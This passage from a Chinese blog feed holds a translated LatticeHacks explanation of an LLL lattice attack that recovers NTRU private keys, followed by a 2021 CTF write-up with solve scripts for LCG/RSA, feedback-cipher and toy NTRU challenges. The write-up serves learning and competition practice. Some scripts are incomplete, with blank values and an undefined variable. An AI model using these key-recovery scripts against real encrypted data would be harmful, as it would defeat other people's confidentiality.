class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">M = Matrix(<span class="number">2</span>*n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n): M[i,i] = q</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">2</span>*n): M[i,i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">M[i+n,j] = convolution(h3, x^i)[j]</span><br><span class="line">M</span><br><span class="line"><span class="comment"># output: [256   0   0   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0 256   0   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0 256   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0 256   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0 256   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0   0 256   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0   0   0 256   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 87 130 194  36  54 210  58   1   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 58  87 130 194  36  54 210   0   1   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [210  58  87 130 194  36  54   0   0   1   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 54 210  58  87 130 194  36   0   0   0   1   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 36  54 210  58  87 130 194   0   0   0   0   1   0   0]</span></span><br><span class="line"><span class="comment"># output: [194  36  54 210  58  87 130   0   0   0   0   0   1   0]</span></span><br><span class="line"><span class="comment"># output: [130 194  36  54 210  58  87   0   0   0   0   0   0   1]</span></span><br></pre></td></tr></table></figure><p>然后使用LLL算法可以快速的找出行组合出来的短向量.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">M.LLL()</span><br><span class="line"><span class="comment"># output: [ -1  -1   1  -1   1   0   0  -1   1  -1  -1   1   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0  -1  -1   1  -1   1   0   0  -1   1  -1  -1   1   0]</span></span><br><span class="line"><span class="comment"># output: [  1  -1   1  -1   0   0   1  -1   1   1  -1   0   0   1]</span></span><br><span class="line"><span class="comment"># output: [ -1   1  -1   0   0   1   1   1   1  -1   0   0   1  -1]</span></span><br><span class="line"><span class="comment"># output: [  1  -1   0   0   1   1  -1   1  -1   0   0   1  -1   1]</span></span><br><span class="line"><span class="comment"># output: [  1   1   1   1   1   1   1   1   1   1   1   1   1   1]</span></span><br><span class="line"><span class="comment"># output: [  0   0   1   1  -1   1  -1   0   0   1  -1   1   1  -1]</span></span><br><span class="line"><span class="comment"># output: [ 39 -28  19  12  11 -48  -4  47   6 -31 -20 -19  36 -18]</span></span><br><span class="line"><span class="comment"># output: [ -5 -34 -14  -3   9 -39 -43  47  54  22   1 -17  19   1]</span></span><br><span class="line"><span class="comment"># output: [  4 -39  28 -19 -12 -11  48  18 -47  -6  31  20  19 -36]</span></span><br><span class="line"><span class="comment"># output: [  9 -40 -43  -5 -32 -13  -1 -17  20   1  47  54  23   3]</span></span><br><span class="line"><span class="comment"># output: [ -1   9 -40 -43  -5 -32 -13   3 -17  20   1  47  54  23]</span></span><br><span class="line"><span class="comment"># output: [ 14   3  -9  40  43   4  32 -22  -3  17 -18  -1 -48 -54]</span></span><br><span class="line"><span class="comment"># output: [ 28 -19 -12 -11  48   4 -39  -6  31  20  19 -36  18 -47]</span></span><br></pre></td></tr></table></figure><blockquote><p>这里详细的解释一下, 因为多项式g的系数就是由$q,q\cdot x,q\cdot x^2,q\cdot x^3,q\cdot x^4,q\cdot x^5,q\cdot x^6,h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$这些项的系数线性组合而来的, 矩阵M左下角那一块就是h3可能出现的系数的排列, 左上角一块是q和$x^n$相乘的系数(其实就是q), 这些行向量进行线性组合的结果中, 肯定存在$g$的系数, 而又因为$g$的系数都是很小的$\{1,0,-1\}$, 所以利用格基规约, 可以把向量$g$规约出来.</p></blockquote><p>第一行的就是$f$对应的$g$, 事实上, 如果$f$的负数那么产生的也是$g$的负数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M.LLL()[<span class="number">0</span>][n:]</span><br><span class="line"><span class="comment"># output: (-1, 1, -1, -1, 1, 0, 0)</span></span><br><span class="line">Zx(<span class="built_in">list</span>(_))</span><br><span class="line"><span class="comment"># output: x^4 - x^3 - x^2 + x - 1</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br></pre></td></tr></table></figure><p>但是攻击者仍然可以解密且不考虑负数. 同样的, LLL 可以产生能够正常用于解密的$x \cdot f$和$x \cdot g$, 所以对于NTRU方案, 需要更大的参数$n$来保证它的安全性.</p><h2 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">publickey</span>):</span></span><br><span class="line">  recip3 = lift(<span class="number">1</span>/Integers(q)(<span class="number">3</span>))</span><br><span class="line">  publickeyover3 = balancedmod(recip3 * publickey,q)</span><br><span class="line">  M = matrix(<span class="number">2</span> * n)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i,i] = q</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i+n,i+n] = <span class="number">1</span></span><br><span class="line">    c = convolution(x^i,publickeyover3)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      M[i+n,j] = c[j]</span><br><span class="line">  M = M.LLL()</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> * n):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      f = Zx(<span class="built_in">list</span>(M[j][n:]))</span><br><span class="line">      f3 = invertmodprime(f,<span class="number">3</span>)</span><br><span class="line">      <span class="keyword">return</span> (f,f3)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">return</span> (f,f)</span><br><span class="line"></span><br><span class="line">n = <span class="number">120</span></span><br><span class="line">q = <span class="number">2</span>^<span class="number">32</span></span><br><span class="line">d = <span class="number">81</span></span><br><span class="line"></span><br><span class="line">publickey,secretkey = keypair()</span><br><span class="line">donald = attack(publickey)</span><br><span class="line"><span class="built_in">print</span> donald[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  m = randommessage()</span><br><span class="line">  c = encrypt(m,publickey)</span><br><span class="line">  <span class="keyword">assert</span> decrypt(c,donald) == m</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;attack successfully decrypts&#x27;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;attack was unsuccessful&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个脚本用的是Python2的sage? 真的要用来解题估计还得自己写一个</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;打了个比赛NTRU不会做, 翻密码爷爷的博客发现一个宝藏网站&lt;a href=&quot;https://latticehacks.cr.yp.to/&quot;&gt;https://latticehacks.cr.yp.to&lt;/a&gt;&lt;br&gt;虽然内容不多, 还是英语的. 这</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021 3月dsactf</title>
    <link href="http://tearsjin.github.io/2021/03/27/writeup-for-2021-3%E6%9C%88dsactf/"/>
    <id>http://tearsjin.github.io/2021/03/27/writeup-for-2021-3%E6%9C%88dsactf/</id>
    <published>2021-03-27T11:36:57.000Z</published>
    <updated>2021-03-29T13:03:51.813Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>orz 还是太菜了，这个比赛密码都被A穿了，我还是做不出NTRU，师傅们都说简单，多项式杀我<br>还是详细记录一下吧，加油</p></blockquote><h1 id="0x00-crypto-threshold"><a href="#0x00-crypto-threshold" class="headerlink" title="0x00 crypto_threshold"></a>0x00 crypto_threshold</h1><blockquote><p>是签到没错了。。。</p></blockquote><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span>(<span class="params">seed,params</span>):</span></span><br><span class="line">    (m,c,n)=params</span><br><span class="line">    s = seed % n</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = (m * s + c) % n</span><br><span class="line">        <span class="keyword">yield</span> s</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">seed = getPrime(<span class="number">128</span>)</span><br><span class="line">m = getPrime(<span class="number">128</span>)</span><br><span class="line">c = getPrime(<span class="number">128</span>)</span><br><span class="line">n = getPrime(<span class="number">129</span>)</span><br><span class="line"></span><br><span class="line">print(m,c,n)</span><br><span class="line">key_stream = lcg(seed,(m,c,n))</span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">num.append(<span class="built_in">next</span>(key_stream))</span><br><span class="line"></span><br><span class="line">print(num)</span><br><span class="line">secret =  <span class="built_in">next</span>(key_stream)</span><br><span class="line"></span><br><span class="line">e = nextprime(secret)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_lambda = ((p-<span class="number">1</span>)*(q-<span class="number">1</span>)) / gcd(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(_lambda)</span><br><span class="line">print(p*q)</span><br><span class="line">print(<span class="built_in">pow</span>(flag,e,p*q))</span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># data</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>条件全给的LCG，直接往下推就好了。<br>$\lambda$RSA, 直接求逆就是私钥了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span>(<span class="params">seed, params</span>):</span></span><br><span class="line">    (m, c, n) = params</span><br><span class="line">    s = seed % n</span><br><span class="line">    <span class="keyword">return</span> (m * s + c) % n</span><br><span class="line"></span><br><span class="line">m, c, n = (<span class="number">315926151576125492949520250047736865439</span>, <span class="number">204423972944032372640132172728460755543</span>,</span><br><span class="line">           <span class="number">375402477603617093440157245062608289367</span>)</span><br><span class="line">seed = <span class="number">287868671713011127830359814204794790287</span></span><br><span class="line">e = nextprime(lcg(seed, (m, c, n)))</span><br><span class="line">_lambda = </span><br><span class="line">d = invert(e, lam)</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><h1 id="0x01-FeedBack"><a href="#0x01-FeedBack" class="headerlink" title="0x01 FeedBack"></a>0x01 FeedBack</h1><blockquote><p>流密码的路子，再熟悉不过了</p></blockquote><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span>(<span class="params">c:<span class="built_in">list</span>,a:<span class="built_in">list</span></span>)-&gt;int:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a))) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m:<span class="built_in">list</span>,k:<span class="built_in">list</span></span>)-&gt;list:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)*<span class="number">2</span>):</span><br><span class="line">        m.append(cycle(m[i:i+<span class="built_in">len</span>(k)],k))</span><br><span class="line">    <span class="keyword">return</span> m[<span class="built_in">len</span>(k):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key=[<span class="built_in">ord</span>(random.choice(hexdigits)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line">    c=enc(<span class="built_in">list</span>(flag),key)</span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># data</span></span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>简单说一下整个过程吧，key和flag的长度都是27这个仔细点看应该就可以看出来了.<br>记$key = (k_0,k_1,\cdots,k_{26}),flag = (m_0,m_1,\cdots,m_{26})$<br>这里的加密其实就是计算$m_{n+1}$然后放在最后面<br>$$<br>m_{n+1} =m_nk_{26} + m_{n-1}k_{25}+\cdots +m_{n-26}k_0<br>$$<br>再来看看条件，题目给了$m_{27},m_{28},\cdots,m_{80}$一共54个。写成矩阵就知道这54个能干什么大事情了<br>$$<br>\begin{pmatrix}<br>m_{27}&amp;m_{28}&amp;\cdots&amp;m_{53} \\<br>m_{28}&amp;m_{29}&amp;\cdots&amp;m_{54} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>m_{53}&amp;m_{54}&amp;\cdots&amp;m_{79}<br>\end{pmatrix}<br>\begin{pmatrix}<br>k_0 \\<br>k_1 \\<br>\vdots \\<br>k_{26}<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>m_{54} \\<br>m_{55} \\<br>\vdots \\<br>m_{80}<br>\end{pmatrix}<br>$$<br>所以这54个m已经可以解出全部的$key$了</p><p>解出27个$key$以后，就是题目所说的<code>feedback</code>了， 我们知道，前27个$m$计算下一个$m$，而$m_{53} = m_{52}k_{26}+\cdots+m_{26}k_0$, 可以看到这个式子里， 我们只有$m_{26}$不知道，直接解方程或者爆破都可以解出来。解出$m_{26}$就可以按着这个思路一路往回解，直到解出全部$m$。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span>(<span class="params">c,a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a))) </span><br><span class="line"></span><br><span class="line">c = [...]</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    v = c[i:i+<span class="number">27</span>]</span><br><span class="line">    A.append(v)</span><br><span class="line">s = vector(c[<span class="number">27</span>:])</span><br><span class="line">A = Matrix(A)</span><br><span class="line">a = A.solve_left(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = c[:<span class="number">27</span>]</span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        res = cycle([i] + c[:-<span class="number">1</span>],a)</span><br><span class="line">        <span class="keyword">if</span> res == c[-<span class="number">1</span>]:</span><br><span class="line">            c = [i] + c[:-<span class="number">1</span>]</span><br><span class="line">            m.append(<span class="built_in">chr</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(m[::-<span class="number">1</span>])        </span><br></pre></td></tr></table></figure><h1 id="0x02-son-of-NTRU"><a href="#0x02-son-of-NTRU" class="headerlink" title="0x02 son_of_NTRU"></a>0x02 son_of_NTRU</h1><blockquote><p>做过一样的题了，那道题还是我格的启蒙，怎么会忘呢<br><a href="https://xz.aliyun.com/t/7163">https://xz.aliyun.com/t/7163</a> - 从一道CTF题初探NTRU格密码</p></blockquote><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/bash/env python3</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b = b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = randrange(<span class="number">1</span>,(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">        g = randrange((p//<span class="number">4</span>)**(<span class="number">0.5</span>),(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">        <span class="keyword">if</span> gcd(f,p)==<span class="number">1</span> <span class="keyword">and</span> gcd(f,g)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f,p)*g)%p</span><br><span class="line">    <span class="keyword">return</span> h,p,f,g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,h,p</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> m&lt;(p//<span class="number">4</span>)**(<span class="number">0.5</span>)</span><br><span class="line">    r = randrange(<span class="number">1</span>,(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">    c = (r*h+m)%p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">h,p,f,g = generate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">c = encrypt(bytes_to_long(flag),h,p)</span><br><span class="line">print(<span class="string">&quot;h = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(h))</span><br><span class="line">print(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment"># h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004</span></span><br><span class="line"><span class="comment"># p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469</span></span><br><span class="line"><span class="comment"># c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses-2"><a href="#analyses-2" class="headerlink" title="analyses"></a>analyses</h2><p>不多说了，前面说的那个blog说的超级清楚。这道题在生成参数的时候给了一大堆条件就是为了在格基规约的时候能够把$f$和$g$规约出来。还有！那个同余式要参数够小才能模$g$约去随机数$r$。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line">h = <span class="number">70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004</span></span><br><span class="line">p = <span class="number">125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469</span></span><br><span class="line">c = <span class="number">4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700</span></span><br><span class="line"></span><br><span class="line">v1 = vector([<span class="number">1</span>,h])</span><br><span class="line">v2 = vector([<span class="number">0</span>,p])</span><br><span class="line">f,g = Matrix([v1,v2]).LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line">d = <span class="built_in">int</span>(inverse_mod(f,g))</span><br><span class="line">x = <span class="built_in">int</span>((c * f) % p %g )</span><br><span class="line">l2b((x * d)%g)</span><br></pre></td></tr></table></figure><h1 id="0x03-threshold"><a href="#0x03-threshold" class="headerlink" title="0x03 threshold"></a>0x03 threshold</h1><blockquote><p>真正的NTRU，我太菜了不知道多项式要怎么处理，去dawn_wispher爷爷的Blog学习一下，学会了再来更新<br>3/29 俺回来了, 俺学会了, 不过这边只扔一波脚本, 具体原理可以去看我的另外一篇<a href="">Translation of LatticeHacks</a></p></blockquote><h2 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 